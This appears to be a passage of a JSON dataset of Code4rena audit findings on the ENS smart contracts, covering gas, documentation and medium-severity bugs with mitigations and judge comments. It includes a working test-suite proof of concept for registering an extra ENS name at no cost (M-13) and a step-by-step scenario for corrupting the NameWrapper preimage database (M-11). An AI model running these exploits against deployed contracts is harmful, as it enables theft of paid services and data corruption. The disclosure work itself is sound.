â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n\n```\n\n### Lines\n\n*   DNSSECImpl.sol:93\n\n*   ETHRegistrarController.sol:256\n\n*   BytesUtils.sol:266\n\n*   BytesUtils.sol:313\n\n*   ERC1155Fuse.sol:92\n\n*   ERC1155Fuse.sol:205\n\n*   StringUtils.sol:14\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-02-uncheckedi-instead-of-i-or-use-assembly-when-applicable",
      "tags": [],
      "finders": []
    },
    {
      "id": "5560",
      "title": "[G-01] Use assembly to hash instead of Solidity",
      "impact": "GAS",
      "content": "\n```js\n\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n    }\n\n    function testGas() public view {\n        c0.solidityHash(2309349, 2304923409);\n        c1.assemblyHash(2309349, 2304923409);\n    }\n}\n\ncontract Contract0 {\n    function solidityHash(uint256 a, uint256 b) public view {\n        //unoptimized\n        keccak256(abi.encodePacked(a, b));\n    }\n}\n\ncontract Contract1 {\n    function assemblyHash(uint256 a, uint256 b) public view {\n        //optimized\n        assembly {\n            mstore(0x00, a)\n            mstore(0x20, b)\n            let hashedVal := keccak256(0x00, 0x40)\n        }\n    }\n}\n```\n\n### Gas Report\n\n```js\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract0 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 36687              â”† 214             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ solidityHash       â”† 313             â”† 313 â”† 313    â”† 313 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract1 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 31281              â”† 186             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ assemblyHash       â”† 231             â”† 231 â”† 231    â”† 231 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n```\n\n### Lines\n\nFor full list of line references, see warden's [original submission](https://github.com/code-423n4/2022-07-ens-findings/issues/176).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-01-use-assembly-to-hash-instead-of-solidity",
      "tags": [],
      "finders": []
    },
    {
      "id": "5559",
      "title": "[L-05] NatSpec is incomplete",
      "impact": "LOW",
      "content": "\n*There are 13 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#l-05-natspec-is-incomplete",
      "tags": [],
      "finders": []
    },
    {
      "id": "5558",
      "title": "[L-04] File is missing NatSpec",
      "impact": "LOW",
      "content": "\n*There are 10 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#l-04-file-is-missing-natspec",
      "tags": [],
      "finders": []
    },
    {
      "id": "5557",
      "title": "[M-13] Users can create extra ENS records at no cost",
      "impact": "MEDIUM",
      "content": "\n[ETHRegistrarController.sol#L249-L268](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L249-L268)<br>\n[ETHRegistrarController.sol#L125](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L125)<br>\n[BaseRegistrarImplementation.sol#L106](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/BaseRegistrarImplementation.sol#L106)<br>\n\nUsers using the `register` function in `ETHRegistrarController.sol`, can create an additional bogus ENS entry (Keep the ERC721 and all the glory for as long as they want) for free by exploiting the `functionCall` in the `_setRecords` function.<br>\nThe only check there (in the setRecord function) is that the nodehash matches the originally registered ENS entry, this is extremely dangerous because the rest of the functionCall is not checked and the controller has very elevated privileges in ENS ecosystem (and probably beyond).\n\nThe single exploit I am showing is already very bad, but I expect there will be more if this is left in. An example of a potential hack is that some of the functions in other ENS contracts (which give the RegistrarController elevated privilege) have dynamic types as the first variables--if users can generate a hash that is a low enough number, they will be able to unlock more exploits in the ENS ecosystem because of how dynamic types are abi encoded.  Other developers will probably also trust the `ETHRegistrarController.sol`, so other unknown dangers may come down the road.\n\nThe exploit I made (full code in PoC) can mint another ENS entry and keep it for as long as it wants, without paying more--will show code below.\n\n### Proof of Concept\n\nPut this code in the `TestEthRegistrarController.js` test suite to run. I just appended this to tests at the bottom of file.\n\nI called the `BaseRegistrarImplementation.register` function with the privileges of `ETHRegistrarController` by passing the base registrar's address as the `resolver` param in the `ETHRegistrarController.register` function call. I was able to set a custom duration at no additional cost.\n\nThe final checks of the PoC show that we own two new ENS entries from a single `ETHRegistrarController.register` call. The labelhash of the new bogus ENS entry is the nodehash of the first registered ENS entry.\n\n```js\n  it('Should allow us to make bogus erc721 token in ENS contract', async () => {\n    const label = 'newconfigname'\n    const name = `${label}.eth`\n    const node = namehash.hash(name)\n    const secondTokenDuration = 788400000 // keep bogus NFT for 25 years;\n\n    var commitment = await controller.makeCommitment(\n      label,\n      registrantAccount,\n      REGISTRATION_TIME,\n      secret,\n      baseRegistrar.address,\n      [\n        baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [\n          node,\n          registrantAccount,\n          secondTokenDuration\n        ]),\n      ],\n      false,\n      0,\n      0\n    )\n    var tx = await controller.commit(commitment)\n    expect(await controller.commitments(commitment)).to.equal(\n      (await web3.eth.getBlock(tx.blockNumber)).timestamp\n    )\n\n    await evm.advanceTime((await controller.minCommitmentAge()).toNumber())\n    var balanceBefore = await web3.eth.getBalance(controller.address)\n\n    let tx2 = await controller.register(\n      label,\n      registrantAccount,\n      REGISTRATION_TIME,\n      secret,\n      baseRegistrar.address,\n      [\n        baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [\n          node,\n          registrantAccount,\n          secondTokenDuration\n        ]),\n      ],\n      false,\n      0,\n      0,\n      { value: BUFFERED_REGISTRATION_COST }\n    )\n\n    expect(await nameWrapper.ownerOf(node)).to.equal(registrantAccount)\n    expect(await ens.owner(namehash.hash(name))).to.equal(nameWrapper.address)\n\n\n    expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us\n      registrantAccount\n    )\n    expect(await baseRegistrar.ownerOf(sha3(label))).to.equal(\n      nameWrapper.address\n    )\n  })\n```\n\n### Tools Used\n\nchai tests in repo\n\n### Recommended Mitigation Steps\n\nI recommend being stricter on the signatures of the user-provided `resolver` and the function that is being called (like safeTransfer calls in existing token contracts).<br>\nAn example of how to do this is by creating an interface that ENS can publish for users that want to compose their own resolvers and call that instead of a loose functionCall. Users will be free to handle data however they like, while restricting the space of things that can go wrong.\n\nI will provide a loose example here:\n\n    interface IUserResolver {\n        function registerRecords(bytes32 nodeId, bytes32 labelHash, bytes calldata extraData)\n\n    }\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/132)**\n\n**[jefflau (ENS) disagreed with severity and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/132#issuecomment-1206584808):**\n > We left this as high severity, but this is a duplicate of this: [#222 comment](https://github.com/code-423n4/2022-07-ens-findings/issues/222#issuecomment-1196396435).\n> \n> I believe this still a low severity, or at a minimum medium.\n> \n> The only thing you can pass to `register` is the node, as the `require` inside `setRecords` checks the nodehash. However `register` in the baseRegistrar itself takes a `label` not the namehash of the name, so it will register a name with the hash of `namehash(namehash('eth') + node)`, which will be a very useless name as the label will then be a 32 byte keccak hash so `0x123...abc.eth`.\n> \n> In the warden's test he tests for the node of the account they originally wanted to buy, not the bogus nft:\n> \n> ```\n> expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us\n>       registrantAccount\n>     )\n> ```\n> \n> To test for the bogus nft they would need to do:\n> \n> ```\n> const node2 = sha3(namehash('eth') + node)\n> expect(await baseRegistrar.ownerOf(node2)).to.equal( // this checks that bogus NFT is owned by us\n>       registrantAccount\n>     )\n> ```\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/132#issuecomment-1255167910):**\n > After a lot of consideration of this issue, I'm going to downgrade it to medium. There are two main considerations in doing this:\n> \n> 1) The \"free\" name created is essentially junk.\n> 2) The additional potential exploits are unknown and kinda hand-wavy. If there are additional exploits in the future as a result of this they almost definitely rely on external factors that don't exist today.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an exploit in the ETHRegistrarController.sol file. This exploit allows users to create an additional bogus ENS entry for free by exploiting the functionCall in the _setRecords function. The only check in this function is that the nodehash matches the originally registered ENS entry, which makes this exploit extremely dangerous. \n\nThe exploit allows users to mint another ENS entry and keep it for as long as they want, without paying more. The code for the exploit is provided in the report. \n\nThe impact of this exploit is that it can be used to unlock other exploits in the ENS ecosystem. Other developers may also trust the ETHRegistrarController.sol, so other unknown dangers may come down the road.\n\nThe recommended mitigation steps for this exploit are to be stricter on the signatures of the user-provided resolver and the function that is being called. An example of how to do this is by creating an interface that ENS can publish for users that want to compose their own resolvers and call that instead of a loose functionCall. This will restrict the space of things that can go wrong.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/132",
      "tags": [],
      "finders": [
        "ronnyx2017",
        "Limbooo",
        "bin2chen",
        "PwnedNoMore",
        "wastewa"
      ]
    },
    {
      "id": "5556",
      "title": "[M-12] `ERC1155Fuse`: `_transfer` does not revert when sent to the old owner",
      "impact": "MEDIUM",
      "content": "\nThe `safeTransferFrom` does not comply with the ERC1155 standard when the token is sent to the old owner.\n\n### Proof of Concept\n\nAccording to the EIP-1155 standard for the `safeTransferFrom`:\n\n> MUST revert if balance of holder for token `_id` is lower than the `_value` sent.\n\nLet's say `alice` does not hold any token of `tokenId`, and `bob` holds one token of `tokenId`. Then alice tries to send one token of `tokenId` to bob with `safeTranferFrom(alice, bob, tokenId, 1, \"\")`.  In this case, even though alice's balance (= 0) is lower than the amount (= 1) sent, the `safeTransferFrom` will not revert. Thus, violating the EIP-1155 standard.<br>\nIt can cause problems for other contracts using this token, since they assume the token was transferred if the `safeTransferFrom` does not revert. However, in the example above, no token was actually transferred.\n\n```solidity\n// https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284\n// wrapper/ERC1155Fuse.sol::_transfer\n// ERC1155Fuse::safeTransferFrom uses _transfer\n\n274     function _transfer(\n275         address from,\n276         address to,\n277         uint256 id,\n278         uint256 amount,\n279         bytes memory data\n280     ) internal {\n281         (address oldOwner, uint32 fuses, uint64 expiry) = getData(id);\n282         if (oldOwner == to) {\n283             return;\n284         }\n```\n\n### Recommended Mitigation Steps\n\nRevert even if the `to` address already owns the token.\n\n**[jefflau (ENS) confirmed and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/179#issuecomment-1196491844):**\n > Recommend severity QA.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/179#issuecomment-1205864807):**\n > I'm going to leave this as Medium. This issue could definitely impact other protocols and potentially cause a loss of funds given external factors.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the ERC1155Fuse.sol contract, which is used to implement the ERC1155 standard. This bug affects the `safeTransferFrom` function, which is used to transfer tokens from one address to another. The bug causes the function to not comply with the ERC1155 standard, as it does not revert when the balance of the sender is lower than the amount sent. This can cause problems for other contracts that rely on the token being transferred if the `safeTransferFrom` does not revert. To mitigate this issue, it is recommended to revert even if the `to` address already owns the token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/179",
      "tags": [],
      "finders": [
        "zzzitron"
      ]
    },
    {
      "id": "5555",
      "title": "[M-11] The preimage DB (i.e., `NameWrapper.names`) can be maliciously manipulated/corrupted",
      "impact": "MEDIUM",
      "content": "\n[NameWrapper.sol#L520](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L520)<br>\n\nBy design, the `NameWrapper.names` is used as a preimage DB so that the client can query the domain name by providing the token ID. The name should be correctly stored. To do so, the `NameWrapper` record the domain's name every time it gets wrapped. And as long as all the parent nodes are recorded in the DB, wrapping a child node will be very efficient by simply querying the parent node's name.\n\nHowever, within a malicious scenario, it is possible that a subdomain can be wrapped without recording its info in the preimage DB.\n\nSpecifically, when `NameWrappper.setSubnodeOwner` / `NameWrappper.setSubnodeRecord` on a given subdomain, the following code is used to check whether the subdomain is wrapped or not. The preimage DB is only updated when the subdomain is not wrapped (to save gas I beieve).\n\n```solidity\nfunction setSubnodeOwner(\n    bytes32 parentNode,\n    string calldata label,\n    address newOwner,\n    uint32 fuses,\n    uint64 expiry\n)\n    public\n    onlyTokenOwner(parentNode)\n    canCallSetSubnodeOwner(parentNode, keccak256(bytes(label)))\n    returns (bytes32 node)\n{\n    bytes32 labelhash = keccak256(bytes(label));\n    node = _makeNode(parentNode, labelhash);\n    (, , expiry) = _getDataAndNormaliseExpiry(parentNode, node, expiry);\n    if (ens.owner(node) != address(this)) {\n        ens.setSubnodeOwner(parentNode, labelhash, address(this));\n        _addLabelAndWrap(parentNode, node, label, newOwner, fuses, expiry);\n    } else {\n        _transferAndBurnFuses(node, newOwner, fuses, expiry);\n    }\n}\n```\n\nHowever, the problem is that `ens.owner(node) != address(this)` is not sufficient to check whether the node is alreay wrapped. The hacker can manipulate this check by simply invoking `EnsRegistry.setSubnodeOwner` to set the owner as the `NameWrapper` contract without wrapping the node.\n\nConsider the following attack scenario.\n\n*   the hacker registers a 2LD domain, e.g., `base.eth`\n*   he assigns a subdomain for himself, e.g., `sub1.base.eth`\n    *   the expiry of `sub1.base.eth` should be set as expired shortly\n    *   note that the expiry is for `sub1.base.eth` instead of `base.eth`, so it is safe to make it soonly expired\n*   the hacker waits for expiration and unwraps his `sub1.base.eth`\n*   the hacker invokes `ens.setSubnodeOwner` to set the owner of `sub2.sub1.base.eth` as NameWrapper contract\n*   the hacker re-wraps his `sub1.base.eth`\n*   the hacker invokes `nameWrapper.setSubnodeOwner` for `sub2.sub1.base.eth`\n    *   as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty\n*   the hacker invokes `nameWrapper.setSubnodeOwner` for `eth.sub2.sub1.base.eth`.\n    *   as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes `\\x03eth`\n\nIt is not rated as a High issue since the forged name is not valid, i.e., without the tailed `\\x00` (note that a valid name should be like `\\x03eth\\x00`). However, the preimage BD can still be corrupted due to this issue.\n\n### Suggested Fix\n\nWhen wrapping node `X`, check whether `NameWrapper.names[X]` is empty directly, and update the preimage DB if it is empty.\n\n### Proof of Concept / Attack Scenario\n\nFor full details, please see [original warden submission](https://github.com/code-423n4/2022-07-ens-findings/issues/197).\n\n**[jefflau (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/197)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the NameWrapper.sol contract of the 2022-07-ens repository on Github. This bug allows a malicious actor to manipulate the preimage DB, which is used to query domain names by providing the token ID. This is done by exploiting the `NameWrapper.setSubnodeOwner` and `NameWrapper.setSubnodeRecord` functions, which only check whether the subdomain is wrapped or not when they are called. The malicious actor can set the owner of a subdomain as the NameWrapper contract without actually wrapping the node. This leads to the preimage DB being corrupted, as the name is not valid without its tailed `\\x00`.\n\nThe suggested fix is to check whether `NameWrapper.names[X]` is empty directly when wrapping node `X`, and update the preimage DB if it is empty. A Proof of Concept (PoC) file named `poc3.js` has been provided to demonstrate the exploit. To run the PoC, put it in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`. If there are any issues running the PoC, the contact person is `izhuer#0001` on Discord.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/197",
      "tags": [],
      "finders": [
        "PwnedNoMore"
      ]
    },
    {
      "id": "5554",
      "title": "[M-10] Incorrect implementation of `RRUtils.serialNumberGte`",
      "impact": "MEDIUM",
      "content": "\n[RRUtils.sol#L266-L268](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/dnssec-oracle/RRUtils.sol#L266-L268)<br>\n\nComparing serial numbers should follow RFC1982 due to the possibility of numbers wrapping around. `RRUtils.serialNumberGte` tried to follow the RFC but failed to do so, leading to incorrect results in comparison.\n\n### Proof of Concept\n\nFor a serial number i1 to be greater than i2, the rules provided by RFC1982 is as follow<br>\n`((i1 < i2) && ((i2 - i1) > (2**31))) || ((i1 > i2) && ((i1 - i2) < (2**31)))`\n\nENS implements `int32(i1) - int32(i2) > 0`, which will suffer from revert in cases such as `i1=0x80000000, i2=0x7fffffff`\n\n### Recommended Mitigation Steps\n\nUse the naive implementation instead<br>\n`return (i1 == i2) || ((i1 < i2) && ((i2 - i1) > (2**31))) || ((i1 > i2) && ((i1 - i2) < (2**31)));`\n\n**[Arachnid (ENS) disagreed with severity and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/211#issuecomment-1196209242):**\n > This is intentional, see https://en.wikipedia.org/wiki/Serial_number_arithmetic#General_solution\n> \n> Nevertheless, this should be documented. Recommend triaging as QA.\n\n**[Arachnid (ENS) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/211#issuecomment-1204468784):**\n > Correction - while the operation is correct per the Wikipedia article, it should be in an `unchecked` block to allow overflow. Recommend triaging as 2.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/211#issuecomment-1205771385):**\n > Agree with the sponsor. This is a bug and it does potentially impact protocol functionality, but it will not occur until far in the future, making it fairly unlikely. Medium makes sense here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an incorrect comparison of serial numbers in the RRUtils.sol file of the ENS project. The comparison should follow the RFC1982 rules due to the possibility of numbers wrapping around, however the current implementation fails to do so and leads to incorrect results. The bug is proven with a proof of concept, which shows that the current implementation of `int32(i1) - int32(i2) > 0` will suffer from a revert in cases such as `i1=0x80000000, i2=0x7fffffff`. The recommended mitigation step is to use the naive implementation instead, which follows the RFC1982 rules.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/211",
      "tags": [],
      "finders": [
        "Lambda  zzzitron",
        "GimelSec"
      ]
    },
    {
      "id": "5553",
      "title": "[M-09] The `unwrapETH2LD` use `transferFrom` instead of `safeTransferFrom` to transfer ERC721 token",
      "impact": "MEDIUM",
      "content": "\n[NameWrapper.sol#L327-L346](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L327-L346)<br>\n\nThe `unwrapETH2LD` use `transferFrom` to transfer ERC721 token, the `newRegistrant` could be an unprepared contract.\n\n### Proof of Concept\n\nShould a ERC-721 compatible token be transferred to an unprepared contract, it would end up being locked up there. Moreover, if a contract explicitly wanted to reject ERC-721 safeTransfers.<br>\nPlus take a look to [the OZ safeTransfer comments](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-):<br>\n`Usage of this method is discouraged, use safeTransferFrom whenever possible.`\n\n### Recommended Mitigation Steps\n\n```diff\n    function unwrapETH2LD(\n        bytes32 labelhash,\n        address newRegistrant,\n        address newController\n    ) public override onlyTokenOwner(_makeNode(ETH_NODE, labelhash)) {\n        _unwrap(_makeNode(ETH_NODE, labelhash), newController);\n-       registrar.transferFrom(\n+       registrar.safeTransferFrom(\n            address(this),\n            newRegistrant,\n            uint256(labelhash)\n        );\n    }\n```\n\n**[jefflau (ENS) disputed and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/157#issuecomment-1196450983):**\n > Transfer is to the contract itself, so there is no point in using `safeTransferFrom`. For other situations where `transferFrom` the behaviour is intended.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/157#issuecomment-1204004769):**\n > > Transfer is to the contract itself, so there is no point in using `safeTransferFrom`. For other situations where `transferFrom` the behaviour is intended.\n> \n> That's incorrect in the report above. This is transferring from, not to, the contract itself.\n\n**[jefflau (ENS) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/157#issuecomment-1204016628):**\n > > That's incorrect in the report above. This is transferring from, not to, the contract itself.\n> \n> Yes sorry, that is true. I was replying to some of the duplicates that I closed such as: [#126](https://github.com/code-423n4/2022-07-ens-findings/issues/126), [#147](https://github.com/code-423n4/2022-07-ens-findings/issues/147). \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `unwrapETH2LD` function in the NameWrapper.sol contract. The vulnerability occurs when the `newRegistrant` is an unprepared contract. This could result in the ERC721 token being locked up in the unprepared contract. The proof of concept is that the OZ safeTransfer comments explicitly discourage the usage of this method. The recommended mitigation steps are to change the `registrar.transferFrom` to `registrar.safeTransferFrom` in the code. This will ensure that the tokens are safely transferred to the unprepared contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/157",
      "tags": [],
      "finders": [
        "rbserver",
        "cccz",
        "CRYP70",
        "berndartmueller",
        "RedOneN",
        "benbaessler",
        "0x29A",
        "Amithuddar",
        "Sm4rty"
      ]
    },
    {
      "id": "5552",
